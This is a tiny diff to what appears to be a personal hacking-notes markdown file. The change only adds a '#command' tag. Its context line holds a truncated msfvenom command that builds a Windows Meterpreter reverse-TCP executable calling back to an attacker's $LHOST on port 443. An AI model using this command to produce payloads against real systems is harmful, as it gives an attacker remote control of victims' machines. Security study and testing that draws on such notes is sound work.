@@ -8,4 +8,4 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o
 - ~/kb/hacking/commands/msfvenom-commands.md
 
 Tags:
-    #assorted
+    #assorted #command
